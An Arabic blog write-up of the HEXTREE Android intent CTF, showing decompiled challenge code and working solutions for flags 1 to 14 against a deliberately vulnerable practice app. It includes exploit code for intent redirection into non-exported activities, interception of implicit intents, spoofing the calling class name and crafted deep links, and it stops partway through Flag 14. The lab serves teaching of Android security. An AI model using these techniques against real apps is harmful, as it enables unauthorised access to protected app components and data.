+++
date = '2025-07-30T00:55:36+03:00'
draft = false
title = 'HEX Tree intent تحديات'
tags = ['Ctf', 'Andorid', 'intent', 'implicit', 'deep link', 'pending']
+++

### Flag 1

#### تحليل الكود

```java
public class Flag1Activity extends AppCompactActivity {
    public Flag1Activity() {
        this.name = "Flag 1 - Basic exported activity";
        this.flag = "zABitOReWutKdkrMKx2NPVXklOmLz1SB85u2kJjUe1ojI9LMWkbEKkjANz15WHmb";
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);  
        this.f.addTag("basic-main-activity-avd2");
        success(this);
    }
```

لما الـ activity دي بتستدعا ، الـ constructor هيحط اسم الـ activity "Flag 1 - Basic exported activity" ويعرّف متغير الـ flag. الـ LogHelper ده بيستخدم عشان يضيف tag اسمه "basic-main-activity-avd2" وبعدين method success بتتنادى.

#### الحل

يعني بس بتشغيل الـ activity دي الـ method هتشتغل وده ممكن يحصل بـ Explicit intent. من الكود نلاقي:

1. package= **"io.hextree.attacksurface"**
2. class name : **io.hextree.attacksurface.activities.Flag1Activity**

Java:

```java
Intent EvilIntent = new Intent();
EvilIntent.setComponent(new ComponentName(
 "io.hextree.attacksurface",
 "io.hextree.attacksurface.activities.Flag1Activity"
)); 
startActivity(EvilIntent);  
```

![alt](flag1.png)

ADB:

```shell
adb shell am start-activity io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
```

### Flag 2

#### تحليل الكود

```xml
<activity
android:name="io.hextree.attacksurface.activities.Flag2Activity"
android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
   </intent-filter>
</activity>
```

هنا الـ Filter بيوضح إن الـ Activity ده بيسمع لـ **action string**: `io.hextree.action.GIVE_FLAG` و كده هيقدر يستقبل intent العنده  الـ action ده

```Java
protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        String action = getIntent().getAction();
        if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
            return;
        }
        this.f.addTag(action);
        success(this);
    } 
```

الـ Intent بيتستقبل بالـ  `getIntent()` والـ action بيتقرا ب  `getAction()`  وبعدين يتحفظ في string `action`، ثم يتشيك لو null (فاضي) أو مختلف عن الـ flag. لو كله تمام وسليم، `success()` بتتنادى.

#### الحل

نحط الـ flag و نحط الـ Package والـ activity name الصح

```java
Intent EvilIntent = new Intent();
EvilIntent.setComponent(new ComponentName(
 "io.hextree.attacksurface",
 "io.hextree.attacksurface.activities.Flag2Activity"
)); 
EvilIntent.setAction("io.hextree.action.GIVE_FLAG");
startActivity(EvilIntent);  
```

### Flag 3

#### تحليل الكود

```xml
<activity
	android:name="io.hextree.attacksurface.activities.Flag3Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
        <data android:scheme="https"/>
    </intent-filter>
</activity>
```

هنا الـ filter بيشيك على حاجتين:

- action name
- specific data / content -> url اللي هو https protocol

```java
	Intent intent = getIntent();
	String action = intent.getAction();
	if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
           return;
	    }
	this.f.addTag(action);
	Uri data = intent.getData();
	if (data == null || !data.toString().equals("https://app.hextree.io/map/android")) {
           return;
	    }
	this.f.addTag(data);
    success(this);
```

هيتستقبل intent والـ action بتتشيك وبعدين الـ data بتتحفظ في متغير نوع Uri وبعدين تتشيك بعد ما تتحول لـ string ولو زي بعض، الـ condition هيتخطى وsuccess هتتنادى.

#### الحل

من تحليلنا:

- package= **"io.hextree.attacksurface"**
- Intent action: `"io.hextree.action.GIVE_FLAG"`
- data : "https://app.hextree.io/map/android"
- class name : **io.hextree.attacksurface.activities.Flag3Activity**

```java
Intent EvilIntent = new Intent();
EvilIntent.setComponent(new ComponentName(
 "io.hextree.attacksurface",
 "io.hextree.attacksurface.activities.Flag3Activity"
)); 
EvilIntent.setAction("io.hextree.action.GIVE_FLAG");
EvilIntent.setData(Uri.parse("https://app.hextree.io/map/android"));
startActivity(EvilIntent);  
```

### Flag 4

#### تحليل الكود

```java
public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        stateMachine(getIntent());
    }
```

الـ constructor بينادى على  `onCreate()` والـ `starMachine()` بتتنادى والـ intent المستقبل بيتبعت ليها

```java
public void stateMachine(Intent intent) {
  
        String action = intent.getAction();
        int ordinal = getCurrentState().ordinal();
        if (ordinal != 0) {
            if (ordinal != 1) {
                if (ordinal != 2) {
                    if (ordinal == 3) {
                        this.f.addTag(State.GET_FLAG);
                        setCurrentState(State.INIT);
                        success(this);
                        return;
                    }
                    if (ordinal == 4 && "INIT_ACTION".equals(action)) {
                        setCurrentState(State.INIT);
                        Toast.makeText(this, "Transitioned from REVERT to INIT", 0).show();
                        return;
                    }
                } else if ("GET_FLAG_ACTION".equals(action)) {
                    setCurrentState(State.GET_FLAG);
                    Toast.makeText(this, "Transitioned from BUILD to GET_FLAG", 0).show();
                    return;
                }
            } else if ("BUILD_ACTION".equals(action)) {
                setCurrentState(State.BUILD);
                Toast.makeText(this, "Transitioned from PREPARE to BUILD", 0).show();
                return;
            }
        } else if ("PREPARE_ACTION".equals(action)) {
            setCurrentState(State.PREPARE);
            Toast.makeText(this, "Transitioned from INIT to PREPARE", 0).show();
            return;
        }
        Toast.makeText(this, "Unknown state. Transitioned to INIT", 0).show();
        setCurrentState(State.INIT);
    }
```

- الـ activity ده **بيطبق "state machine"** اللي **بيفتكر حالته** عبر الاستدعاءات (استدعاء activity)، باستخدام `SolvedPreferences`. حسب **الحالة الحالية** والـ **action** للـ `Intent` الجاي، **بينتقل للحالة اللي بعدها** أو يعيد تشغيل العملية.
- بس لو **تعدي كل الحالات صح** بالترتيب (`INIT ➔ PREPARE ➔ BUILD ➔ GET_FLAG`)، **هيديك الـ flag**

#### الحل

طيب المفروض نبعتهم بالترتيب ده؟ جربت وفشل، ليه؟ ده لأن لما تبعتهم بالترتيب التصاعدي، آخر intent هيكون أول حاجة المستخدم يتعامل معاها فهيبدأ من الآخر (ترتيب عكسي).

ده ما يعرف ب ***activity back stack*** في الأندرويد او  **Last-In-First-Out (LIFO)**  (الاخير هو الاول في الظهور) ف حل بسيط يكون إنك تبعت  intents بترتيب عكسي من الأول


```java
Intent TheKey = new Intent();  
TheKey.setComponent(new ComponentName(
"io.hextree.attacksurface",
"io.hextree.attacksurface.activities.Flag5Activity"));    
startActivity(TheKey);  
  
Intent getFlagIntent = new Intent();  
getFlagIntent.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag4Activity"));  
getFlagIntent.setAction("GET_FLAG_ACTION");  
startActivity(getFlagIntent);  
  
Intent buildIntent = new Intent();  
buildIntent.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag4Activity"));  
buildIntent.setAction("BUILD_ACTION");  
startActivity(buildIntent);  
  
Intent prepareIntent = new Intent();  
prepareIntent.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag4Activity"));  
prepareIntent.setAction("PREPARE_ACTION");  
startActivity(prepareIntent);
```

### Flag 5

#### تحليل الكود

```java
public void onCreate(Bundle bundle) {

        Intent intent = getIntent();
        Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
        if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
            return;
        }
        this.f.addTag(42);
        Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
        this.nextIntent = intent3;
        if (intent3 == null || intent3.getStringExtra("reason") == null) {
            return;
        }
        this.f.addTag("nextIntent");
        if (this.nextIntent.getStringExtra("reason").equals("back")) {
            this.f.addTag(this.nextIntent.getStringExtra("reason"));
            success(this);
        } else if (this.nextIntent.getStringExtra("reason").equals("next")) {
            intent.replaceExtras(new Bundle());
            startActivity(this.nextIntent);
        }
    }
```

هنا الكود بيحاول ياخد data من intent اللي فيه intent تاني كـ extra data لما الـ intent يتفك، الـ activity هيشغله لنا باستخدام `startActivity()`

- `intent2` لازم يكون فيه int extra `"return"` بقيمة `42`.
- `intent2` لازم يكون فيه nested parcelable intent تحت `"nextIntent"`.
- `nextIntent` لازم يكون فيه string extra `"reason"` بقيمة `"back"`.

`intet -> intent2("return",42) -> intent3("reason", "back)`

#### الحل

```java
Intent intent3 = new Intent();  
intent3.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag5Activity"));  
intent3.putExtra("reason","back");  
  
Intent intent2 = new Intent();  
intent2.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag5Activity"));  
intent2.putExtra("return", 42);  
intent2.putExtra("nextIntent", intent3);  
  
Intent intent = new Intent();  
intent.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag5Activity"));  
intent.putExtra("android.intent.extra.INTENT", intent2);  

startActivity(intent);
```

### Flag 6

#### تحليل الكود

```java
public void onCreate(Bundle bundle) {
        if ((getIntent().getFlags() & 1) != 0) {
            this.f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
            success(this);
        }
    }
```

بسيط، بس نبعت intent مع  `FLAG_GRANT_READ_URI_PERMISSION"` flag .... صح؟

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag6Activity"
    android:exported="false"/>
```

بس من الـ xml الـ activity مش exported يعني منقدرش نبعت مباشرة

يعني عايزين حاجة فيها startActivity() ونقدر نناديها عشان لما نديها intent تروح من "Activity A" ل "Activity B" ال مkقدرش نناديه مباشرة

**_Activity 5 فيه المطلوب ده_**

```java
if (this.nextIntent.getStringExtra("reason").equals("back")) {
            this.f.addTag(this.nextIntent.getStringExtra("reason"));
            success(this);
        } else if (this.nextIntent.getStringExtra("reason").equals("next")) {
            intent.replaceExtras(new Bundle());
            startActivity(this.nextIntent);
        }
```

#### الحل

هنستخدم الحل اللي فات بس نغير الـ extra text في intent3 من `back` -> `next`، والـ class اللي بنناديه ونديله الـ permissions المطلوبة `.FLAG_GRANT_READ_URI_PERMISSION`

```java
Intent intent3 = new Intent();  
intent3.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag6Activity"));  
intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);  
intent3.putExtra("reason","next");  
  
Intent intent2 = new Intent();  
intent2.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag5Activity"));  
intent2.putExtra("return", 42);  
intent2.putExtra("nextIntent", intent3);  
  
Intent intent = new Intent();  
intent.setComponent(new ComponentName(
"io.hextree.attacksurface", 
"io.hextree.attacksurface.activities.Flag5Activity"));  
intent.putExtra("android.intent.extra.INTENT", intent2);  

startActivity(intent);
```

### Flag 7

#### تحليل الكود

```java
 public void onCreate(Bundle bundle) {
        String action = getIntent().getAction();
        if (action == null || !action.equals("OPEN")) {
            return;
        }
        this.f.addTag("OPEN");
    }
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        String action = intent.getAction();
        if (action == null || !action.equals("REOPEN")) {
            return;
        }
        this.f.addTag("REOPEN");
        success(this);
    }
```

الـ intent المستقبل، محتوى الـ Action هيتشيك للـ `"OPEN"`. بس عشان نوصل لـ `success()` محتاجين `onNewIntent()` اللي:

- بيجيب **action string** من **الـ intent الجديد الجاي**.
- لو الـ action `null` أو مش يساوي `"REOPEN"`، بيخرج/return.
- لو الـ action هو `"REOPEN"`، بيضيف الـ tag `"REOPEN"` وينادي `success(this)`.

بس إزاي نشغل `onNewIntent()`؟ الـ method ده جزء من **Activity lifecycle** وبيتشغل **بس** لما:

- الـ activity تكون **شغالة فعلاً**، وتشتغل بـ intent مابيعملش  **instance جديد** (يعني نستخدم نفس الصفحة و لو فيها بيانات نكمل عليها مش كل ما نبعت نبتدي من الصفر) و ده  حسب **launch mode** أو **intent flags**.

#### الحل

باستخدام ADB:

```shell
adb shell 
am start -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN
sleep 1
am start -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top
```

أو سطر واحد زي:

```shell
adb shell "am start -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN && sleep 1 && am start -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top"
```

ده بس بيشغل shell على الجهاز ويستخدم activity manager `am` اللي بيشغل الـ  `Flag7Activity` مع action `OPEN` بعدين يتوقف ثانية واحدة عشان يتأكد إن الـ activity اشتغل و اتحمل و تقدر تتفاعل معاه. بعدين يشغله تاني مع action `REOPEN` ويجبره يشتغل `single-top` عشان يستخدم الـ activity مش يبدأ واحد جديد

باستخدام java:

1. لو الـ activity بيبدأ بسرعة، مش محتاج delay:

```java
Intent firstIntent = new Intent();  
firstIntent.setClassName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag7Activity"  
);  
firstIntent.setAction("OPEN");  
startActivity(firstIntent);  
  
Intent reopenIntent = new Intent();  
reopenIntent.setAction("REOPEN"); // مطلوب عشان نشغل success()  
reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);  
reopenIntent.setClassName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag7Activity"  
);  
startActivity(reopenIntent);
```

2. باستخدام delay:

```java
 Intent openIntent = new Intent();
    openIntent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag7Activity"
    );
    openIntent.setAction("OPEN");
    startActivity(openIntent);

    // 2. بعد delay، نبعت "REOPEN" intent عشان نشغل onNewIntent
    new Handler(Looper.getMainLooper()).postDelayed(() -> {
        Intent reopenIntent = new Intent();
        reopenIntent.setClassName(
            "io.hextree.attacksurface",
            "io.hextree.attacksurface.activities.Flag7Activity"
        );
        reopenIntent.setAction("REOPEN");
        reopenIntent.addFlags(
            Intent.FLAG_ACTIVITY_SINGLE_TOP |  // استخدم الـ activity الموجود
            Intent.FLAG_ACTIVITY_CLEAR_TOP     // امسح instances تانية
        );
        startActivity(reopenIntent);
    }, 1000); // delay ثانية واحدة عشان نتأكد إن الـ activity شغال
```

3. باستخدام single_Top flag:

```java
Intent firstIntent = new Intent();  
firstIntent.setClassName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag7Activity"  
);  
firstIntent.setAction("OPEN");  
startActivity(firstIntent);  
  
try { Thread.sleep(1000); } catch (Exception e) {}  
  
Intent reopenIntent = new Intent();  
reopenIntent.setAction("REOPEN"); // مطلوب عشان نشغل success()  
reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);  
reopenIntent.setClassName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag7Activity"  
);  
startActivity(reopenIntent);
```

استخدام single_Top flag كفاية بس ممكن تحتاج flags زيادة في سيناريوهات مختلفة زي في حالات activity تاني يحاول يكون فوق مكان التطبيق العاوز تهجم علية  الخ الخ الخ....

لمعلومات أكتر شوف [[android life cycle]]

### Flag 8

#### تحليل الكود

```java
 ComponentName callingActivity = getCallingActivity();
        if (callingActivity != null) {
            if (callingActivity.getClassName().contains("Hextree")) {
                this.f.addTag("calling class contains 'Hextree'");
                success(this);
            } else {
                Log.i("Flag8", "access denied");
                setResult(0, getIntent());
            }
        }
```

- الـ Activity ده بيجيب معلومات عن الـ activity اللي شغله باستخدام `getCallingActivity()`. ده بيرجع `ComponentName` object يحدد هوية الـ calling activity (مين الباشا البيكلمنا).
- بعدين بيشيك لو الـ activity الحالي اتشغل من activity تاني باستخدام `startActivityForResult()` _(calling activity)_
- بعدين بيشيك لو اسم class الخاص بالـ calling activity فيه string "Hextree"

#### الحل

عشان أحل ده عملت class هيكون ليه الاسم المطلوب

```java
public class Hextree extends AppCompatActivity {  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        Intent intent = new Intent();  
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity"));  
        startActivityForResult(intent,42);  
    } 
}
```

### Flag 9

#### تحليل الكود

```java
        ComponentName callingActivity = getCallingActivity();
        if (callingActivity == null || !callingActivity.getClassName().contains("Hextree")) {
            return;
        }
        Intent intent = new Intent("flag");
        this.f.addTag(intent);
        this.f.addTag(42);
        intent.putExtra("flag", this.f.appendLog(this.flag));
        setResult(-1, intent);
        finish();
        success(this);
```

الـ Activity دي بتجيب معلومات عن الـ activity اللي شغاله باستخدام `getCallingActivity()`. ده بيرجع `ComponentName` object يحدد هوية الـ calling activity.

- بعدين بيشيك لو الـ activity الحالي اتشغل من activity تاني باستخدام `startActivityForResult()` _(calling activity)_
- بعدين بيشيك لو اسم class الخاص بالـ calling activity فيه string "Hextree"

الفرق الوحيد بين ده والـ `Flag 8` هو  هنطبق `onActivityResult()`

#### الحل

```java
public class Hextree extends AppCompatActivity {  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        EdgeToEdge.enable(this);  
        setContentView(R.layout.activity_hextree);  
  
        Intent intent = new Intent();  
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity"));  
        startActivityForResult(intent,42);  
        
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {  
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());  
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);  
            return insets;  
        });  
    }  
  
    @Override  
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {  
        super.onActivityResult(requestCode, resultCode, data);  
        if (requestCode == 42) {  
            Utils.showDialog(this, data);  
        }  
    }  
}
```

### Flag 10

#### تحليل الكود

```java
if (getIntent().getAction() == null) {
            Toast.makeText(this, "Sending implicit intent with the flag\nio.hextree.attacksurface.ATTACK_ME", 1).show();
            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
            intent.addFlags(8);
            this.f.addTag(intent);
            intent.putExtra("flag", this.f.appendLog(this.flag));
            try {
                startActivity(intent);
                success(this);
            } catch (RuntimeException e) {
                e.printStackTrace();
                Toast.makeText(this, "No app found to handle the intent\nio.hextree.attacksurface.ATTACK_ME", 1).show();
                finish();
            }
        }
```

لما intent يتبعت للـ activity ده ومافيش action مكتوب، في Toast message هتظهر و intent هيتعمل ب `"io.hextree.attacksurface.ATTACK_ME"`  action وشوية flags و data هتتحط عشان تتبعت مع الـ intent

```xml
<activity
       android:name="io.hextree.attacksurface.activities.Flag10Activity"
       android:exported="false"/>
```

بس من الـ xml مkقدرش نناديه مباشرة؟

#### الحل

***هنا الـ تطبيق  بيساعدنا  لما نضغط على رقم  challenge منه  هو الهيبدأه لينا ويبعت الـ intent

نعمل Intent-filter يسمع للـ action `"io.hextree.attacksurface.ATTACK_ME"` وفي الـ activity نجيب الـ intent ونقرا محتواه.

```xml
<activity  
    android:name=".implicitIntent"  
    android:exported="true">  
    <intent-filter>        
	    <action android:name="io.hextree.attacksurface.ATTACK_ME"/>  
        <category android:name="android.intent.category.DEFAULT"/>  
    </intent-filter>
</activity>
```

```java
Intent recivedIntent = getIntent();  
Utils.showDialog(this,recivedIntent);
```

طبعا في الحقيقة ممكن تتعامل مع المحتوى جوا الـ intent و تعدل علية او ترجعة و هكذا

**أو** لو الـ app مساعدناش إيه رأيك نعمل حاجة تانية _**زي اللي عملناه في Flag 6!**_

هنعدي أول 2 checks من activity 5 وفي التالت هننادي activity 10 **بس** من غير ما نضيف flags مناسبة، الـ intents هتفضل تنادي بعض ده هيعمل infinite loop، عشان أحل ده ضفت حاجتين

الـ flags دول بيتستخدموا عشان نتحكم في سلوك الـ activity stack (back stack) لما نشغل activity جديدة.  

الأول `Intent.FLAG_ACTIVITY_CLEAR_TOP` :

- **الهدف**: بيمسح كل الـ activities اللي فوق الـ target activity في الـ stack
- **الوظيفة**:
    - لو الـ activity موجود فعلاً في الـ stack، هيتجاب قدام
    - كل الـ activities اللي فوقه هتتمسح
    - لو اتستخدم لوحده، هيعمل instance جديد من الـ activity by default (يعيده من الاول)

الثاني `Intent.FLAG_ACTIVITY_SINGLE_TOP` :

- **الهدف**: بيمنع عمل instances كتير من نفس الـ activity
- **الوظيفة**:
    - لو الـ activity موجودة فوق في الـ stack، مش هيعمل instance جديد
    - بدلاً من كده، `onNewIntent()` هتنادى على الـ instance الموجود
    - لو الـ activity موجود بس مش فوق، instance جديدة هتتعمل

```java
Intent intent3 = new Intent();  
intent3.setComponent(new ComponentName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag10Activity"));  
intent3.putExtra("reason","next");  
  
Intent intent2 = new Intent();  
intent2.setComponent(new ComponentName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag5Activity"));  
intent2.putExtra("return", 42);  
intent2.putExtra("nextIntent", intent3);  
  
Intent intent = new Intent();  
intent.setComponent(new ComponentName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag5Activity"));  
intent.putExtra("android.intent.extra.INTENT", intent2);  
intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);  
startActivity(intent);  
finish();
```

### Flag 11

#### تحليل الكود

```java
  public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        if (getIntent().getAction() == null) {
            Toast.makeText(this, "Sending implicit intent to\nio.hextree.attacksurface.ATTACK_ME", 1).show();
            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
            intent.addFlags(8);
            try {
                startActivityForResult(intent, 42);
            } catch (RuntimeException e) {
                e.printStackTrace();
                Toast.makeText(this, "No app found to handle the intent\nio.hextree.attacksurface.ATTACK_ME", 1).show();
                finish();
            }
        }
    }
    public void onActivityResult(int i, int i2, Intent intent) {
        if (intent != null && intent.getIntExtra("token", -1) == 1094795585) {
            this.f.addTag(1094795585);
            success(this);
        }
        super.onActivityResult(i, i2, intent);
    }
```

زي الـ Activity اللي فاتت ده بيشوف هل  intent فاضي ؟ بس دلوقتي هيبدأه وهو مستني results عن طريق `startActivityForResult`، الـ Intent محتاج يكون فيه `token` كـ extra بقيمة `1094795585`

#### الحل

الـ xml زي اللي فات ونقدر نستخدم نفس الـ intent (اللي استقبلناه من activity11) ونضغط على flag11 من الـ app (Intent Attack Surface)

```java
    Intent recivedIntent = getIntent();  
    Utils.showDialog(this,recivedIntent);  
  
    // عشان نرجع result  
    recivedIntent.putExtra("token",1094795585);  
    setResult(RESULT_OK, recivedIntent);  
    finish()
```

أو ناخد الطريق الطويل الصعب

ده كان صعب لأن الـ intent الجه كان فاضي بس ده ممكن يكون مشكلة من عندي فقررت أفصلهم على 2 activities (واحد يبدأ request والتاني يستقبل ويبعت intent تاني)

بس واجهت مشاكل زي flag10 ولأن الـ flags اللي ضفتها مسحت instance الخاص بـ activity11 فحتى لو ناديته وبعتلي intent ميقدرش يرجعله لأن الـ instance المحدد ده اتقفل فعشان أحل ده ضفت نفس الـ flag عشان حتى لو اتقفل يتشغل تاني

ضفت method finish عشان أقفل الـ activities دي و توقف instance الخاص بـ activity 11 & 5 في الـ background و اقدر أبعت الـ result بتاعي

```java
Intent intent3 = new Intent();  
intent3.setComponent(new ComponentName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag11Activity"));  
intent3.putExtra("reason","next");  
intent3.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);  
  
Intent intent2 = new Intent();  
intent2.setComponent(new ComponentName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag5Activity"));  
intent2.putExtra("return", 42);  
intent2.putExtra("nextIntent", intent3);  
  
Intent intent = new Intent();  
intent.setComponent(new ComponentName(  
        "io.hextree.attacksurface",  
        "io.hextree.attacksurface.activities.Flag5Activity"));  
intent.putExtra("android.intent.extra.INTENT", intent2);  
intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);  
startActivity(intent);  
finish();
```

```java
Intent recivedIntent = getIntent();  
Utils.showDialog(this,recivedIntent);  
  
// عشان نرجع result  
recivedIntent.putExtra("token",1094795585);  
setResult(RESULT_OK, recivedIntent);  
finish();
```

### Flag 12

#### تحليل الكود

```xml
<activity
       android:name="io.hextree.attacksurface.activities.Flag12Activity"
       android:exported="true"/>
```

وأيوة نقدر نبعته مباشرة لـ activity 

```java
public void onCreate(Bundle bundle) {
        if (getIntent().getAction() == null) {
            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
            intent.addFlags(8);
            startActivityForResult(intent, 42);   
            }
        }
    }
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (intent == null || 
	        getIntent() == null || 
	        !getIntent().getBooleanExtra("LOGIN", false)) 
	        {
	            return;
        }
        this.f.addTag("LOGIN");
        if (intent.getIntExtra("token", -1) == 1094795585) {
            this.f.addTag(1094795585);
            success(this);
        }
```

محتاجين نبعت intent فاضي بعدين هيبعت intent بـ action `"io.hextree.attacksurface.ATTACK_ME"`، بعدين نبعت intent مع Boolean `"LOGIN"` `true` و extra `"token"` `1094795585`

#### الحل

```java
Intent wakeUp= new Intent();
wakeUp.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");
startActivity(wakeUp);

Intent intent2 = new Intent();
intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");
intent2.putExtra("LOGIN", true);
startActivity(intent2);

Intent receivedIntent = getIntent();
receivedIntent.putExtra("token", 1094795585); // التشيك على الرقم السحري        
setResult(RESULT_OK, receivedIntent);
finish();
```

### Flag 13

#### تحليل الكود

```xml
    <activity
        android:name="io.hextree.attacksurface.activities.Flag15Activity"
        android:exported="true">
        <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="hex"/>
                <data android:host="open"/>
                <data android:host="flag"/>
        </intent-filter>
    </activity>
```

هنا الـ activity بيسمع لـ intent ممكن يجي من browser بـ scheme (protocol) :`hex` و host (domain) : `open` أو `flag`

```java
 private boolean isDeeplink(Intent intent) {
        String action;
        return (
        intent == null || 
        (action = intent.getAction()) == null || 
        !action.equals("android.intent.action.VIEW") ||
        !intent.getCategories().contains("android.intent.category.BROWSABLE")||
        intent.getStringExtra("com.android.browser.application_id") == null
        ) ? false : true;
    }

    public void onCreate(Bundle bundle) {
        Intent intent = getIntent();
        if (intent == null) {
            finish();
        }
        if (isDeeplink(intent)) {
            Uri data = intent.getData();
            if (data.getHost().equals("flag") && 
	            data.getQueryParameter("action").equals("give-me"))
	            {
                success(this);
                return;
            } else {
                if ( !data.getHost().equals("open") || 
	                 data.getQueryParameter("message") == null)
                {
                    return;
                }
                return;
            }
        }
        Intent intent2 = new Intent("android.intent.action.VIEW");
        intent2.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World"));
        startActivity(intent2);
    }
```

الـ activity هيشتغل لما ياخد intent اللي هو Deeplink:

- مش فاضي
- فيه action `android.intent.action.VIEW`
- فيه category `"android.intent.category.BROWSABLE"`
- فيه extra string `"com.android.browser.application_id"` مش فاضي

data جوا الـ Deeplink:

- Host هو `flag`
- parameter `"action"` بقيمة `"give-me"`

#### الحل

هنستخدم الموقع المتاح عشان نحل التحديات اللي بتتضمن بعت url requests للـ app بتاعنا وهو هيتعامل مع إنشاء الـ deeplinks لنا

```txt
hex://flag?action=give-me
```

### Flag 14

#### تحليل الكود

```xml
<activity
            android:name="io.hextree.attacksurface.activities.Flag14Activity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data
                    android:scheme="hex"
                    android:host="token"/>
            </intent-filter>
        </activity>
```

الـ actions والـ scheme زي `flag13` بس الـ host دلوقتي بس `token`

```java
public void onCreate(Bundle bundle) {

        if (intent.getAction() == null) 
        {
            Intent intent2 = new Intent("android.intent.action.VIEW");
            String uuid = UUID.randomUUID().toString();
            SolvedPreferences.putString(getPrefixKey("challenge"), uuid);
            intent2.setData(
            Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-app-auth?authChallenge=" + uuid));
            startActivity(intent2);
            return;
        }
        if (intent.getAction().equals("android.intent.action.VIEW")) {
            Uri data = intent.getData();
            String queryParameter = data.getQueryParameter("type");
            String queryParameter2 = data.getQueryParameter("authToken");
            String queryParameter3 = data.getQueryParameter("authChallenge");
            String string = SolvedPreferences.getString(getPrefixKey("challenge"));
            if (queryParameter == null || queryParameter2 == null || queryParameter3 == null || !queryParameter3.equals(string)) {
                Toast.makeText(this, "Invalid login", 1).show();
                finish();
                return;
            }
            this.f.addTag(queryParameter);
            try {
                String encodeToString = Base64.getEncoder().encodeToString(MessageDigest.getInstance("SHA-256").digest(queryParameter2.getBytes()));
                if (encodeToString.equals("a/AR9b0XxHEX7zrjx5KNOENTqbsPi6IsX+MijDA/92w=")) {
                    if (queryParameter.equals("user")) {
                        Toast.makeText(this, "User login successful", 1).show();
                    } else if (queryParameter.equals("admin")) {
                        Log.i("Flag14", "hash: " + encodeToString);
                        this.f.addTag(queryParameter2);
                        Toast.makeText(this, "Admin login successful", 1).show();
                        success(this);
                    }
                }
            }
        }
